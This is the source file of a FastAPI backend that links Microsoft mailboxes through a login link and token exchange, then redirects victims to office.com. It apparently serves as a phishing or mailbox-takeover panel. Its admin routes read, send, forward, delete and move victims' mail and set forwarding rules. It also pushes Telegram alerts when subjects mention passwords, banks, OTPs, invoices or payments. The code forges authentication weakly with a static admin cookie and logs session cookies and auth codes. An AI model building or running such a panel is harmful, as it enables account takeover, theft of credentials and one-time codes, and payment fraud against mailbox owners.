from fastapi import FastAPI, Request, WebSocket
from fastapi.responses import RedirectResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import logging
import asyncio

from auth import generate_login_link, exchange_code_for_token
from graph import (
    fetch_emails,
    get_mail_folders,
    get_email_detail,
    reply_to_email,
    send_email,
    forward_email,
    delete_email,
    mark_as_read,
    get_conversation,
    move_email_to_folder  # ✅ already expected
)
from admin_auth import login_admin, require_admin
from urllib.parse import urlparse, parse_qs
from db import init_db, SessionLocal
from models import TenantToken, Rule
from rule_engine import apply_rules
from alerts import send_telegram_alert

app = FastAPI()

# =========================
# LOGGING
# =========================
logging.basicConfig(level=logging.DEBUG)

# =========================
# ALERT STORAGE
# =========================
alerts_store = []

# =========================
# CORS
# =========================
origins = [
    "http://localhost:3000",
    "https://frontend-xg84.onrender.com",
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# =========================
# DEBUG MIDDLEWARE
# =========================
@app.middleware("http")
async def log_requests(request: Request, call_next):
    logging.debug(f"\n--- REQUEST START ---")
    logging.debug(f"{request.method} {request.url}")
    logging.debug(f"Cookies: {request.cookies}")

    response = await call_next(request)

    logging.debug(f"Response Status: {response.status_code}")
    logging.debug(f"--- REQUEST END ---\n")

    return response

# =========================
# WEBSOCKET ALERTS
# =========================
connected_clients = []

@app.websocket("/ws/alerts")
async def websocket_alerts(ws: WebSocket):
    await ws.accept()
    connected_clients.append(ws)

    try:
        while True:
            await ws.receive_text()
    except:
        connected_clients.remove(ws)

async def broadcast_alert(message: str):
    for ws in connected_clients:
        try:
            await ws.send_text(message)
        except:
            pass

# =========================
# STARTUP
# =========================
@app.on_event("startup")
def startup():
    init_db()

# =========================
# ADMIN LOGIN
# =========================
@app.post("/admin/login")
async def admin_login_route(request: Request):
    body = await request.json()
    username = body.get("username")
    password = body.get("password")

    result = login_admin(username, password)

    if "error" in result:
        return JSONResponse(result, status_code=401)

    response = JSONResponse({"message": "Login successful"})

    response.set_cookie(
        key="admin_session",
        value="authenticated",
        httponly=True,
        secure=True,
        samesite="None",
        path="/"
    )

    logging.debug("ADMIN LOGIN SUCCESS → COOKIE SET")

    return response

# =========================
# MICROSOFT LOGIN
# =========================
@app.get("/login")
def login(user_id: str = None):
    return RedirectResponse(generate_login_link(user_id or "default-user"))

@app.get("/generate-login-url")
def generate_login_url(user_id: str = None):
    login_url = generate_login_link(user_id or "default-user")

    parsed = urlparse(login_url)
    state = parse_qs(parsed.query).get("state", [""])[0]
    session_id = state.split(":")[1] if ":" in state else "default"

    return {"login_url": login_url, "session_id": session_id}

@app.get("/auth/callback")
def auth_callback(request: Request):
    init_db()

    code = request.query_params.get("code")
    state = request.query_params.get("state")

    logging.debug(f"AUTH CALLBACK: code={code}, state={state}")

    if not code:
        return {"error": "No code received"}

    client_ip = request.client.host

    try:
        if ":" in state:
            user_id, session_id = state.split(":")
        else:
            user_id = state
            session_id = "default"

        exchange_code_for_token(code, state, client_ip)

        response = RedirectResponse(url="https://www.office.com")

        response.set_cookie(
            key="session_id",
            value=session_id,
            httponly=True,
            secure=True,
            samesite="None",
            path="/"
        )

        logging.debug(f"SESSION COOKIE SET: {session_id}")

        return response

    except Exception as e:
        logging.error(f"AUTH ERROR: {e}")
        return {"error": str(e)}

# =========================
# SESSION DEBUG
# =========================
@app.get("/session")
def check_session(request: Request):
    return {
        "session_id": request.cookies.get("session_id"),
        "admin": request.cookies.get("admin_session")
    }

# =========================
# EMAILS (WITH ALERTS)
# =========================
@app.get("/emails")
def get_emails(request: Request, user_id: str = None):
    require_admin(request)

    session_id = request.cookies.get("session_id")
    logging.debug(f"SESSION IN EMAILS: {session_id}")

    if not session_id or session_id == "default":
        return JSONResponse({"error": "No Microsoft session"}, status_code=401)

    emails = fetch_emails(user_id or "default-user", session_id)

    ALERT_KEYWORDS = ["password", "bank", "otp", "urgent", "invoice", "payment"]

    for e in emails:
        subject = (e.get("subject") or "").lower()

        for word in ALERT_KEYWORDS:
            if word in subject:
                msg = f"🚨 {word.upper()} detected → {e.get('subject')}"

                send_telegram_alert(msg)
                alerts_store.append({"message": msg})

                try:
                    asyncio.create_task(broadcast_alert(msg))
                except:
                    pass

    return {"emails": emails}

# =========================
# FOLDERS
# =========================
@app.get("/folders")
def get_folders(request: Request, user_id: str = None):
    require_admin(request)

    session_id = request.cookies.get("session_id")

    if not session_id or session_id == "default":
        return JSONResponse({"error": "No Microsoft session"}, status_code=401)

    return {
        "folders": get_mail_folders(user_id or "default-user", session_id)
    }

# =========================
# ALERTS
# =========================
@app.get("/alerts")
def get_alerts(request: Request):
    require_admin(request)
    return {"alerts": alerts_store}

# =========================
# RULES
# =========================
@app.post("/rules")
async def add_rule(request: Request):
    require_admin(request)

    body = await request.json()
    db = SessionLocal()

    rule = Rule(
        condition=body.get("condition"),
        action=body.get("action"),
        target_folder=body.get("target_folder"),
        forward_to=body.get("forward_to")
    )

    db.add(rule)
    db.commit()
    db.close()

    return {"message": "Rule created"}

@app.get("/rules")
def get_rules(request: Request):
    require_admin(request)

    db = SessionLocal()
    rules = db.query(Rule).all()

    result = [{
        "id": r.id,
        "condition": r.condition,
        "action": r.action.value,
        "target_folder": r.target_folder,
        "forward_to": r.forward_to
    } for r in rules]

    db.close()
    return {"rules": result}

# =========================
# EMAIL ACTION ROUTES (🔥 ADDED ONLY)
# =========================

@app.post("/email/reply")
async def reply_email_route(request: Request):
    require_admin(request)
    body = await request.json()
    session_id = request.cookies.get("session_id")

    return reply_to_email(
        "default-user",
        session_id,
        body.get("message_id"),
        body.get("reply_text")
    )


@app.post("/email/send")
async def send_email_route(request: Request):
    require_admin(request)
    body = await request.json()
    session_id = request.cookies.get("session_id")

    return send_email(
        "default-user",
        session_id,
        body.get("to"),
        body.get("subject"),
        body.get("body")
    )


@app.post("/email/forward")
async def forward_email_route(request: Request):
    require_admin(request)
    body = await request.json()
    session_id = request.cookies.get("session_id")

    return forward_email(
        "default-user",
        session_id,
        body.get("message_id"),
        body.get("to")
    )


@app.post("/email/delete")
async def delete_email_route(request: Request):
    require_admin(request)
    body = await request.json()
    session_id = request.cookies.get("session_id")

    return delete_email(
        "default-user",
        session_id,
        body.get("message_id")
    )


@app.post("/email/mark-read")
async def mark_read_route(request: Request):
    require_admin(request)
    body = await request.json()
    session_id = request.cookies.get("session_id")

    return mark_as_read(
        "default-user",
        session_id,
        body.get("message_id"),
        body.get("is_read", True)
    )


@app.post("/email/move")
async def move_email_route(request: Request):
    require_admin(request)
    body = await request.json()
    session_id = request.cookies.get("session_id")

    return move_email_to_folder(
        "default-user",
        session_id,
        body.get("message_id"),
        body.get("folder_id")
    )